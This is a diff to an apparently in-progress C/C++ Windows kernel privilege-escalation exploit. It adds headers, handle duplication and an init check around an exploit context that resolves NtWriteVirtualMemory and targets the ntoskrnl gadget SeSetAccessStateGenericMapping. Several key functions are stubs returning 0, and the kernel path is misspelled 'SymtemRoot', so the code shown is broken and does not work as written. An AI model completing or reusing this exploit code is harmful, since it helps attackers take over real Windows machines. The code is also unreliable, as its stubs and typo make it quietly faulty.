@@ -1,6 +1,11 @@
 #include <stdio.h>
+#include <tchar.h>
 #include <windows.h>
-#include <winternl.h>
+#include <strsafe.h>
+#include <string>
+#include <ntstatus.h>
+#include <processthreadsapi.h>
+#include <tlhelp32.h>
 #include "ntos.h"
 
 typedef NTSTATUS(WINAPI* _NtQuerySystemInformation)(
@@ -106,10 +111,12 @@ DWORD64 GetModuleAddr(const char* name) {
     PSYSTEM_MODULE_INFORMATION buffer = (PSYSTEM_MODULE_INFORMATION)malloc(0x20);
     DWORD outBuffer = 0;
     NTSTATUS status = g_pExploitCtx->fnNtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemModuleInformation, buffer, 0x20, &outBuffer);
+    return 0;
 }
 
 DWORD64 GetGadgetAddr(const char* name) {
     DWORD64 base = GetModuleAddr("\\SymtemRoot\\system32\\ntoskrnl.exe");
+    return 0;
 }
 
 SIZE_T GetObjectKernelAddress(PEXPLOIT_CONTEXT pCtx, HANDLE object) {
@@ -119,7 +126,7 @@ SIZE_T GetObjectKernelAddress(PEXPLOIT_CONTEXT pCtx, HANDLE object) {
     NTSTATUS status;
     SIZE_T kernelAddress = 0;
     BOOL bFind = FALSE;
-
+    return 0;
 }
 
 BOOL InitEnvironment() {
@@ -128,11 +135,20 @@ BOOL InitEnvironment() {
     g_pExploitCtx->fnNtWriteVirtualMemory = (_NtWriteVirtualMemory)GetProcAddress(LoadLibrary(L"ntdll.dll"), "NtWriteVirtualMemory");
     g_pExploitCtx->pPeb = NtCurrentTeb()->ProcessEnvironmentBlock;
 
+    if (!DuplicateHandle(GetCurrentProcess(), GetCurrentProcess(), GetCurrentProcess(), &g_pExploitCtx->hCurProcessHandle, 0, FALSE, DUPLICATE_SAME_ACCESS) ||
+        !DuplicateHandle(GetCurrentProcess(), GetCurrentThread(), GetCurrentProcess(), &g_pExploitCtx->hCurThreadHandle, 0, FALSE, DUPLICATE_SAME_ACCESS))
+        return FALSE;
+
+    
+
 }
 
 int main(int argc, TCHAR* argv[])
 {
-
+    if (!InitEnvironment()) {
+        printf("[-]Inappropriate Operating System\n");
+        return 0;
+    }
     LoadLibrary(L"user32.dll");
     DWORD64 GadgetAddr = GetGadgetAddr("SeSetAccessStateGenericMapping");
     NTSTATUS ntStatus;
